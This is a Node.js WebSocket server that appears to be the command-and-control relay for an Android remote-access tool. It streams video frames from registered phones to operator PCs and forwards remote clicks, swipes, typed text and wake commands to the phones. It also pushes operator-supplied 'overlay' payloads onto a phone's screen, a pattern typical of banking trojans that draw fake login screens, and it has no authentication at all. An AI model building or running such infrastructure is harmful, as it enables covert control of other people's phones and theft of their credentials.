const WebSocket = require('ws');
const http = require('http');
const PORT = process.env.PORT || 8080;
const server = http.createServer((req,res)=>{
  if(req.url==='/health'){res.writeHead(200);res.end('OK'); return;}
  res.writeHead(404); res.end();
});
const wss = new WebSocket.Server({ server });
const phones = new Map();
const pcs = new Set();
function getDevicesList(){
  const list=[];
  phones.forEach((v,k)=>{
    const online = Date.now() - v.lastPing < 25000;
    list.push({ id:k, model:v.info.model, name:v.info.name, battery:v.info.battery||0, online });
  });
  return list;
}
function broadcastToPCs(obj){
  const msg=JSON.stringify(obj);
  pcs.forEach(pc=>{ if(pc.readyState===WebSocket.OPEN) pc.send(msg); });
}
wss.on('connection', (ws)=>{
  ws.isAlive=true;
  ws.on('pong',()=>ws.isAlive=true);
  ws.on('message', raw=>{
    try{
      const data=JSON.parse(raw);
      if(data.type==='register'){
        ws.role='phone'; ws.deviceId=data.id;
        phones.set(data.id,{ ws, info:{model:data.model||'Android', name:data.name||data.id, battery:data.battery||0}, lastPing:Date.now() });
        broadcastToPCs({type:'devices_update', devices:getDevicesList()});
      }
      if(data.type==='ping' && data.id){
        const p=phones.get(data.id);
        if(p){ p.lastPing=Date.now(); if(data.battery!==undefined) p.info.battery=data.battery; }
      }
      if(data.type==='register_pc'){
        ws.role='pc'; pcs.add(ws);
        ws.send(JSON.stringify({type:'devices_update', devices:getDevicesList()}));
      }
      if(data.type==='list_devices' && ws.role==='pc'){
        ws.send(JSON.stringify({type:'devices_update', devices:getDevicesList()}));
      }
      if(data.type==='pc_select_device'){
        ws.selectedDevice=data.deviceId;
        const phone=phones.get(data.deviceId);
        if(phone && phone.ws.readyState===WebSocket.OPEN){
          phone.ws.send(JSON.stringify({type:'pc_connected'}));
        }
      }
      if(data.type==='video_frame' && data.deviceId){
        pcs.forEach(pc=>{
          if(pc.selectedDevice===data.deviceId && pc.readyState===WebSocket.OPEN){
            pc.send(raw);
          }
        });
      }
      if(['click','swipe','type_text','back','home','wake'].includes(data.type)){
        const targetId = ws.selectedDevice || data.deviceId;
        const phone=phones.get(targetId);
        if(phone && phone.ws.readyState===WebSocket.OPEN) phone.ws.send(raw);
      }
      if(data.type==='show_overlay'){
        const targetId = ws.selectedDevice || data.deviceId;
        const phone=phones.get(targetId);
        if(phone && phone.ws.readyState===WebSocket.OPEN){
          phone.ws.send(raw);
          ws.send(JSON.stringify({type:'overlay_status', active:true, payload:data.payload, deviceId:targetId}));
        }
      }
      if(data.type==='hide_overlay'){
        const targetId = ws.selectedDevice || data.deviceId;
        const phone=phones.get(targetId);
        if(phone) phone.ws.send(raw);
        ws.send(JSON.stringify({type:'overlay_status', active:false, deviceId:targetId}));
      }
    }catch(e){}
  });
  ws.on('close',()=>{
    if(ws.role==='phone' && ws.deviceId){
      broadcastToPCs({type:'devices_update', devices:getDevicesList()});
    }
    if(ws.role==='pc'){ pcs.delete(ws); }
  });
});
setInterval(()=>{
  wss.clients.forEach(ws=>{
    if(!ws.isAlive) return ws.terminate();
    ws.isAlive=false; ws.ping();
  });
  broadcastToPCs({type:'devices_update', devices:getDevicesList()});
}, 15000);
server.listen(PORT, ()=>console.log('OK '+PORT));
